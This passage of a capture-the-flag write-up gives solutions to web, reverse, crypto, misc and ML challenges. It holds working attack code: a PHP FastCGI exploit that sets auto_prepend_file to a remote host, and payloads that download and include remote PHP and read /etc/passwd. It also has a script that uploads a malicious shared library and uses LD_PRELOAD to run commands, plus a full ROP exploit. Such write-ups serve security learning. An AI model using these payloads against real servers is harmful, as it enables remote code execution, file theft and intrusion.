        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        fwrite($this->_sock, $request);
        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);
        var_dump($resp);
        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }
        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
    die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
    $filepath = __FILE__;
}else{
    $filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php/php7.2-fpm.sock", -1);
$code = "<?php echo(\$_REQUEST['command']);?>"; // php payload
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://kaibro.tw/gginin";
$params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => '80sec/wofeiwo',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
        );
// print_r($_REQUEST);
// print_r($params);
echo "Call: $uri\n\n";
echo strstr($client->request($params, $code), "PHP Version", true)."\n";
?>
```

Then, I can read files without `open_basedir` restriction now.

e.g. `/etc/passwd` or `/tmp/xxxx/yyyy`, ...

Payload:
```
backdoor=
var_dump(file_put_contents("/tmp/42126aff4925d8592d6042ae2b81de08/a.php", file_get_contents("http://kaibro.tw/ext2")));
include("/tmp/42126aff4925d8592d6042ae2b81de08/a.php");

var_dump(file_get_contents("/etc/passwd"));
```

Output:
```
root:x:0:0:root/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

And I found someone run `/readflag` and put output to a file `/tmp/md5(someone's IP)/flag111.txt`.

So I directly read it and got flag:

```
backdoor=
var_dump(file_put_contents("/tmp/42126aff4925d8592d6042ae2b81de08/a.php", file_get_contents("http://kaibro.tw/ext2")));
include("/tmp/42126aff4925d8592d6042ae2b81de08/a.php");

var_dump(file_get_contents("/tmp/xxxxxxxx/flag111.txt"));
```

Output:
```
flag{PUTENVANDIMAGICKAREGOODFRIENDS}
```

#### Solution 2: Bypass disable_function with LD_PRELOAD

The server is running [php-imagick](https://packages.ubuntu.com/bionic/php/php-imagick). Most of the CVEs are fixed. The ghostscript on Ubuntu 18.04.1 is also patched lots of RCEs.

We can bypass php `disable_functions` via `LD_PRELOAD`. Please refer to [this](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/) and [this](https://github.com/TarlogicSecurity/Chankro/). Basically they leverage the fact that it will execute another process (sendmail). We can inject a malicious library in `LD_PRELOAD`.

The notorious CVE of imagemagick is [ImageTragick](https://imagetragick.com/). The command injection vulnerability of ghostscript make imagemagick also vulnerable to RCE. However, the default policy of imagemagick 6 disables lots of ghostscript types because of this CVE:

```xml
<!-- disable ghostscript format types  -->
<policy domain="coder" rights="none" pattern="PS" />
<policy domain="coder" rights="none" pattern="EPI" />
<policy domain="coder" rights="none" pattern="PDF" />
<policy domain="coder" rights="none" pattern="XPS" />
```

When I check the default policy of Imagemagick 7, I found the ghostscript type `EPS` is missing in Imagemagick 6.

```xml
<policy domain="coder" rights="none" pattern="{PS,PS2,PS3,EPS,PDF,XPS}" />
```

Great! So let's create a EPS file and try to make Imagemagick 6 parse the image with ghostscript. Imagemagick determines the filetype based on both the filename extension and header. This one works for me. In fact, the payload is from CVE-2018-16509 and the RCE CVE does not work in this version of ghostscript.

```
%EPS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%yes) currentdevice putdeviceprops
```

Using php-imagick to open this file `new Imagick("a.eps");` will lead to lots of error message from ghostscript. Then we can exploit this one to trigger RCE! php-imagick will fork and then execve to execute ghostscript to parse the image, so it will load our malicious library through `LD_PRELOAD`. 


```python
#!/usr/bin/env python3
import requests
import base64

def b64(x):
    return base64.b64encode(x).decode()

# https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/ 
# https://github.com/TarlogicSecurity/Chankro/
b = b64(open('./bypass_disablefunc_x64.so','rb').read())
s = requests.session()

payload = f'''
file_put_contents("/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.eps", "%EPS");
file_put_contents("/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.so", base64_decode("{b}"));
var_dump(glob('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/*'));
'''
r = s.post('http://111.186.63.208:31340/', data=dict(backdoor=payload))
print(r.text)


payload = '''
putenv("EVIL_CMDLINE=sh -c /readflag$IFS>$IFS/tmp/bcdcdfaed8c5764fc9c7215e95196e96/pwn");
putenv("LD_PRELOAD=/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.so");
new Imagick("/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.eps");
var_dump(glob('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/*'));
var_dump(file_get_contents('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/pwn'));
'''
r = s.post('http://111.186.63.208:31340/', data=dict(backdoor=payload))
print(r.text)
```

It's possbile to overwrite `PATH` to achieve RCE.

#### Failed Attempts

- `pfb` file format: `pfb` means PostScript Type 1 font program. However PostScript Type 3 supports more powerful functions. I don't think we can exploit ghostscript with this one.
- Search all php function that invokes `execve`: Someone has already done this......please refer to [this article](https://www.exploit-db.com/papers/46045).
- [ghostscript CVE](https://bugs.ghostscript.com/show_bug.cgi?id=700317) in Ubuntu 18.04: This one works in my local environment but it seems that it can only read/write a file. We need RCE in this challenge.
- `dl()`: Dynamically load php extension. However it's disabled by default.


## Reverse
### Elements
After some static analysis, we can figure out the flag format is flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}. And each part in {} separated by '-' is then hex-decoded and processed into one side of an triangle. The first part (`391bc2164f0a`) can be figure out in the program.

If the radius of the inscribed circle ( r ) and the radius of the circumscribed circle ( R ) meet the conditions (r = `19400354808065.54`, and R = `47770539528273.91`), the input is the correct flag.

With gdb, we can easily find out one of the shortest two sides (a = `62791383142154.00`). Then what we need to do is to calculate the other two sides and convert them back to the original value.

One of our teammates gets the approximate values of the other two sides by a drawing tool. Then we write a python code with higher precision to get the very close values (With equations of `Area = a*b*c(4*R) = (a+b+c)*r/2 = sqrt(s*(s-a)*(s-b)*(s-c))`, s = (a+b+c)/2, R is the circumscribed circle  radius, and r is the inscribed circle radius).

```python=
from decimal import *
import math

getcontext().prec = 50

r = Decimal('19400354808065.54')
R = Decimal('47770539528273.91')
a = Decimal('62791383142154')
b = Decimal('70802074077032.9834292')

for x in range(50):

    v = Decimal('0.' + '0' * x + '1')

    for i in range(20):

        b = b + v
        c = (2*R*r + (2*R*r/a)*b) / (b - (2*R*r/a)) # From (a*b*c/(4*R)) = (a+b+c)*r/2
        s = (a + b + c) / 2
        heron = s * (s-a) * (s-b) * (s-c)
        area1 = heron.sqrt()
        area2 = (a * b * c / (4 * R))
        area3 = (a + b + c) * r / 2

        if(area1 > area2):
            b -= v
            break

print('a =', a)
print('b =', b)
print('c =', c)
print('Area by method 1:', area1)
print('Area by method 2:', area2)
print('Area by method 3:', area3)
```

After knowing the two sides
(b = `70802074077032.9834292890321943043996425948069384041`, 
c = `95523798483318.0128249775384414796312000736043319645`), we need to convert them back. We have to know how it processes the original value. We can take the first part of input `391bc2164f0a` to figure out what it does.

First it is split into `391b` and `c2164f0a`. The first part is added to `0x4530000000000000`, and the second part is added to `0x4330000000000000`.
Now, it is `0x453000000000391b` and `0x43300000c2164f0a`. (They are put in a 128-bit register xmm0, as `0x453000000000391b43300000c2164f0a`. To make it simpler, we talk about them as two separated parts.)

Then it takes them as 64-bit floating-points (double type in C/C++) and subtracts `(double) 0x4530000000000000` from the first part, `(double) 0x4330000000000000` from the second part. Now they are `0x42cc8d8000000000` and `0x41e842c9e1400000`.

The next step is simpler. It reverses the two parts and saves them into another 128-bit register xmm1. We currently have `xmm0 = 0x42cc8d800000000041e842c9e1400000` and `xmm1 = 0x41e842c9e140000042cc8d8000000000`.

Finally it adds xmm0 to xmm1, but takes each 64-bit value as type double. That is, The highest 64 bits `0x42cc8d8000000000` in xmm0 is added to `0x41e842c9e1400000` in xmm1, both are in type double. The result is `0x42cc8de10b278500`. The lowest 64 bits works in the same way, but with the same two values in opposite register. The result is `0x42cc8de10b278500` as well. And the lowest 64 bits `0x42cc8de10b278500` is the final result.

In short, if the original value is `ghijklmnopqr`,
the result is the hex value of the following:

`((double) 0x453000000000ghij - (double) 0x4530000000000000) + 
((double) 0x43300000klmnopqr - (double) 0x4330000000000000)`

Since `((double) 0x453000000000ghij - (double) 0x4530000000000000)` is multiple times of `((double) 0x43300000klmnopqr - (double) 0x4330000000000000)`, the first few bits of the result is decided by the former. We can mask it with `0xffffff0000000000` and add (double) `0x4530000000000000` to the result. And the last two bytes is very close to the input `ghij`. 

For example:

a = `391bc2164f0a`
The result is `62791383142154.00`, `42cc8de10b278500` in hex.
Mask it with `0xffffff0000000000`, we get `0x42cc8d0000000000`.
Then we add `(double) 0x4530000000000000` to it. We get `(double) 0x453000000000391a`. The lowest two bytes `391a` is very close to `391b`. We can try the values near it and calculate `klmnopqr`.
Following is a C++ code for converting the result to its original value (we need to adjust the offset):

```C++=
#include <cstdio>

union U
{
	double d;
	long long int i;
};

int main()
{
	int offest = 0;
	U part1, part2, const1, const2, result;
	
	const1.i = 0x4530000000000000;
	const2.i = 0x4330000000000000;
	
	result.i  = 0x42d5b83784e05d81; /* Change this according to the result */
	
	part1.i = result.i & 0xffffff0000000000; /* Mask it */
	part1.d += const1.d; /* Add (double) 0x4530000000000000 to it */
	part1.i += offset; /* try nearby values */
	
	printf("%04x ", part1.i & 0xffff); /* ghij */
	
	part2 = result;
	part2.d += const2.d;
	part2.d -= (part1.d - const1.d);
	
	printf("%08x\n", part2.i & 0xffffffff); /* klmnopqr */
	
	/***** Checking *****/
	
	part1.d -= const1.d;
	part2.d -= const2.d;
	part1.d += part2.d;
	
	printf("Convert back to result: %llx\n", part1.i);
	
	return 0;
}
```

With result = `0x42d019391e61da3f` (hex value of side b), offset = 0, we get `4064e4798769`.
With result = `0x42d5b83784e05d81` (hex value of side c), offset = 0, we get `56e0de138176`.

The flag is `flag{391bc2164f0a-4064e4798769-56e0de138176}`.



### Fixed Point
The algorithm is CRC with polynomial 0xb595cf9c8d708e2166d545cf7cfdd4f9 and all bytes of initial value is 0xff.
Our goal is to find a input that `crc('flag{X}') = X`.

Let `_crc(x) = crc(x)^ crc(0)`.
CRC has a property that when `_crc(a) = b; _crc(c) = d`, then `_crc(a ^ c) = b ^ d`.
Using this property, we can reformulate `_crc` as `_crc('flac{X}') = Ax ^ _crc('flag{0}') = Ax ^ b`,
where A is a matrix that i-th row is `_crc` of i-th bit.
A fixed point means `Ax ^ b = x` implies `(A - I)x = b`.
Build the matrix A, vector b, then it is easily to find a x using sagemath.
### sanitize

**TL;DR**
binary search

```
{}cmp_char
3
guess_position 4 47
```

`flag{fr0M_C0vEr4ge_To_Fl4G_And_Enj0Y_0cTF_2Ol9!}`

**detail**

The binary expects us to input a string , and pick some characters from the flag string, then the binary would perform sorting on these characters. At the end of the binary, it prints out the record of it's code coverage. Which means that we may recover the control flow of binary from these information which sounds difficult. And the key point is what kind of sorting was implemented in the binary.

The below is the detail of the sorting implemented in the binary, take input as `123\n3\n1 2 5\n` for example, which means that take the char at `flag[1]`,`flag[2]`,`flag[5]`, and sort these chars with string `123` together. (Newline would affect the code coverage)

The user input `123` would be processed first, then the characters from flag string.

And the phases of sorting can be summarize as follow : 

1. Build up a List
2. Build a charObject which has `sub_list`,`sub_list_len`,`char_value`,`next`,`parent`
3. Insert the charObject to the List base on the value of `sub_list_len`,which should initialize as`0`. If there were already some objects with 0 `sub_list_len`,the new object would be inserted at the tail of them (it's actually not the length, just for convenience)
4. Compare last two object at row of charObject with same `sub_list_len` value
5. The bigger one would be put into the sublist of the other one
6. Go back to 2. if there are still chars remaining.

So, it look like

```
input :
123
3
1 2 5
#Assume that the flag at remote is 'flag{???????????}'
List -> null 

List -> '1'

List -> '1' -> '2'

List -> '1'
         |
        '2'
        
List -> '3' -> '1'
                |
               '2'
               
List -> 'l' -> '3' -> '1'
                       |
                      '2'
                      
List -> '3' -> '1'
         |      |
        'l'    '2'
        
List -> 'a' -> '1'
                |
               '2'
                |
               '3'
                |
               'l'
               
List -> 'a' -> unknown_char ->  '1'
                                 |
                                '2'
                                 |
                                '3'
                                 |
                                'l'
```

At this point, the next char, which is `flag[5]` would be compare with char `a`, according to the result (> or <=), the binary would give us two different code coverage, but the problem here is we can only compare the last char,`flag[4]` here, with the other char , `flag[1] =='a'` here , which was also from flag string.

If we change the order of the input slightly:

```
123
3
5 1 2
```

Now we can compare the unknown char from string with our input, but the new problem is the code coverage is implemented by a bunch of counter, the flow after this compare may cause them looks the same. So we have to construct a string which make the binary branch predictable. That is : 

```
{}A
3
5 4 47
```
The `flag[4]` and `flag[47]` are `{` and `}` respectively, this input make the path of sorting more predictable due to`{` and `}` are almost bigeer than all ascii. The fun fact here is the last char of flag is `\n`.

**exploit**

```python=
from pwn import *
import string
 
context.log_level ='error'
charset = sorted(list(string.printable[:-5]))
 
flag = []
 
def bsearch(idx,pos):
    p = remote("111.186.63.16",20193)
    p.sendline("{}"+charset[idx]) 
    p.send("3\n"+str(k)+"\n4\n47\n")
    ret = p.recv()
    p.close()
    return ret
 
for k in range(5,47):
    lower = 0
    upper = len(charset)-1
    l_st= bsearch(lower, k)
    u_st = bsearch(upper, k)
 
    while lower < upper:
        mid =  (lower+upper)/2 
        if (bsearch(mid,k) == l_st):
            lower = mid + 1
        else:
            upper = mid
    
    flag.append(charset[lower-1])
    print "flag{"+''.join(flag)+"}"                                           
```

## Crypto
### babyRSA
Factor the modulus with sagemath's `factor()`, we can get two polynomial `p[x], q[x]`.
Calculate the order of group `Poly/p[x]` as `op` and `Poly/q[x]` as `oq` with sagemath's `QuotientRing.order()`.
The rest is as same as typical RSA, decrypt the flag with `msg = pow(enc, invmod(e, (op - 1) * (oq - 1)), N)`.

### zer0lfsr
There are 75% prob that the output bit equals to the output bit of underlying lfsr.
We can generate a subset of bits that satisfied to the lfsr's characteristic polynomial.
Then we use belief propagation to find top k bits that most likely to be correct. (We found k=150 works great.)
After getting those bits, reconstruct the initial state with some basic linear algebra.


### zer0mi
We applied the linearization method discovered by Patarin et al. to attack MI cryptosystem.
The result mapping from target ciphertext to plaintext has a kernel of shape 1x63.
So we generate all 256 possibilities and filter them with the constraint that all chars are ascii.

### babysponge
The state of sponge function has two parts.
In the absorb stage, for each block of our input, we xor it to the first part, change the state with the nonlinear function f, and repeat.
That means we cannot control the value of second part directly.

If we can find two different input blocks that generate same second part,
then we can patch their first parts using their next blocks to construct a identical state.
A identical state means it will output identical hash, which means we find a collision.

The size of second part in this challenge is 48 bits.
The complexity of finding a collision on second part with birthday attack is O(2^24), which is feasible.

## Misc
### flropyd
Just rop :D
```python
#!/usr/bin/env python
from pwn import *

# flag{for_k_in_N_for_i_in_N_for_j_in_N}

e , libc = ELF('./flropyd') , ELF('./libc-2.27.so')
context.arch = 'amd64'
host , port = '111.186.63.203' , 6666
y = remote( host , port )
#y = process( './flropyd' )
#pause()


y.recvuntil( '0x' )
libc.address = int( y.recvline()[:-1] , 16 ) - libc.sym.malloc
l = libc.address
success( 'libc -> %s' % hex( l ) )

ret = l + 0x8aa
pop_rax = l + 0x439c8
pop_rdi = l + 0x2155f
pop_rsi = l + 0x23e6a
pop_rdx = l + 0x1b96
pop_rbp = l + 0x21353
mov_rax_rdi = l + 0x586ed
mov_rax_rsi = l + 0x587f3
mov_rax_rdx = l + 0x52c59
mov_rax_rcx = l + 0x3d24b
mov_rdx_rax = l + 0x1415dd # mov rdx, rax ; ret
mov_ptr_rdi_rsi = l + 0x54a5a
mov_rdi_ptr_r13_call_r12 = l + 0x11de3b # mov rdi, qword ptr [r13] ; call r12
mov0 = l + 0x2f11d # mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
shr_rax_2 = l + 0xd09ea # shr rax, 2 ; ret
shr_al_1 = l + 0x159a07 # shr al, 1 ; ret
shl_al_1 = l + 0x159a07 # shr al, 1 ; ret
leave_ret = l + 0x54803
leave_jmp_rcx = l + 0xa8463 # leave ; jmp rcx
add_rax_rdi = l + 0xa8473 # add rax, rdi ; ret
sub_rax_rdi = l + 0xb17b8 # sub rax, rdi ; ret
add_rax_rsi = l + 0xac21c # add rax, rsi ; ret

g0 = l + 0x520e9 # mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
g3 = l + 0x3093c # mov qword ptr [rdx], rax ; ret
g6 = l + 0x1ab548 # shl dword ptr [rdi - 5], 1 ; ret
g7 = l + 0x145c98 # mov rax, qword ptr [rax] ; ret

jmp = l + 0x14e0a5 # jmp qword ptr [rdx + rax*8]

add_rsp_148 = l + 0x3ed8f # add rsp, 0x148 ; ret
add_rsp_418 = l + 0x11e7fd # add rsp, 0x418 ; ret

wd = 0x602060
mp = 0x602068
rop = 0x60A080

i = 0x60a0a0
j = 0x60a0a8
k = 0x60a0b0

v1 = 0x60a0b8
v2 = 0x60a0c0
v3 = 0x60a0c8

a1 = 0x60a0d0
a2 = 0x60a0d8
a3 = 0x60a0e0

b1 = 0x60a0e8
b2 = 0x60a0f0

n = 0x60a0f8

br_tbl = 0x60a100

def store_long( addr , n ):
    return flat( pop_rdi , addr , pop_rsi , n , mov_ptr_rdi_rsi )

def add( dst , m1 , m2 , c = 0 ):
    p = flat( pop_rdi, m2 - 0x68, g0 )
    if c:
        p = flat( pop_rdi, m2 )
    p += flat(
            pop_rax, m1, g7,        # rax = [m1]
            add_rax_rdi,            # rax += rdi
            pop_rdx, dst, g3        # [dst] = rax
        )
    return p

def sub( dst , m1 , m2 , c = 0 ):
    p = flat( pop_rdi, m2 - 0x68, g0 )
    if c:
        p = flat( pop_rdi, m2 )
    p += flat(
            pop_rax, m1, g7,        # rax = [m1]
            sub_rax_rdi,            # rax += rdi
            pop_rdx, dst, g3        # [dst] = rax
        )
    return p

def load( m1 , m2 ):
    return flat(
                pop_rax, m2, g7, # rax = [m2]
                pop_rdx, m1, g3  # [m1] = rax
            )

def shl( m1 , count ):
    return flat(
                pop_rdi, m1 + 5,
                p64( g6 ) * count
            )

def read_map( dst , x , y ):
    return flat(
                load( v1 , x ),
                shl( v1 , 6 ), # x <<= 6
                add( v1 , v1 , y ), # [v1] = [v1] + [v2]
                shl( v1 , 3 ), # [v1] *= 8
                add( v1 , v1 , mp , c = 1 ), # mp[x][y]
                pop_rax, v1, g7, g7, # rax = mp[x][y]
                pop_rdx, dst, g3 # [dst] = mp[x][y]
            )

def store_map( x , y , m ):
    return flat(
                load( v1 , x ),
                shl( v1 , 6 ), # x <<= 6
                add( v1 , v1 , y ), # [v1] = [v1] + [v2]
                shl( v1 , 3 ), # [v1] *= 8
                add( v1 , v1 , mp , c = 1 ), # [v1] = &mp[x][y]
                pop_rax, v1, g7, mov_rdx_rax, # rdx = &mp[x][y]
                pop_rax, m, g7, g3 # [&mp[x][y]] = [m]
            )

def br( m1 , m2 ):
    return flat(
                pop_rdi, m2 - 0x68, g0, # rdi = [m2]
                pop_rax, m1, g7,        # rax = [m1]
                sub_rax_rdi,            # rax -= rdi
                p64(shr_rax_2) * 31,
                shr_al_1,
                pop_rdx, br_tbl, jmp    # jmp br_tbl[0 or 1]
            )

def migrate( stack ):
    return flat(
                pop_rbp, stack - 8, leave_ret
            )

print hex(len(store_map(1,1,1)))
# 0x60A080
p = flat(
    0x666666, 0x20,
    0, add_rsp_148, # 0x60a090
    0, # 0x60a0a0 i
    0, # 0x60a0a8 j
    0, # 0x60a0b0 k

    0, # 0x60a0b8 a1
    0, # 0x60a0c0 a2
    0, # 0x60a0c8 a3

    0, # 0x60a0d0 b1
    0, # 0x60a0d8 b2
    0, # 0x60a0e0 b3

    0, # 0x60a0e8 b1
    0, # 0x60a0f0 b2
    0, # 0x60a0f8 n

    # 0x60a100
    # branch table
    #0x2222222, 0x1111111
    ret, add_rsp_418
)
p = p.ljust( 0x168 , '\0' )

p += flat(
    load( n , wd ),
    sub( n , n , 1 , c = 1 ),


    store_long( i , 0 ), # 0x60a260
    store_long( j , 0 ), # 0x60a288
    store_long( k , 0 ), # 0x60a2b0
                         # 0x60a2d8

    read_map( a1 , j , k ),
    read_map( a2 , j , i ),
    read_map( a3 , i , k ),
    add( a2 , a2 , a3 ),    # a1 = m[j][k] , a2 = m[j][i] + m[i][k]


    br( a1 , a2 ), #  m[j][k] < m[j][i] + m[i][k] branch
    store_map( j , k , a2 ), #m[j][k] = m[j][i] + m[i][k],
    p64(ret) * ( (0x418 - len( store_map(0,0,0) )) / 8 ),

    add( k , k , 1 , c = 1 ),
    br( n , k ),
    migrate( 0x60a2d8 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),

    add( j , j , 1 , c = 1 ),
    br( n , j ),
    migrate( 0x60a2b0 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),

    add( i , i , 1 , c = 1 ),
    br( n , i ),
    migrate( 0x60a288 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),
)

print hex(len(p))

y.sendafter( ':' , p.ljust( 0x10000 , '\0' ) )


y.interactive()
```
### Neuron Break
This task provides the model and the inputs.
We use FGSM (Fast Gradient Sign Method) with step 0.1 to generate adversarial samples.
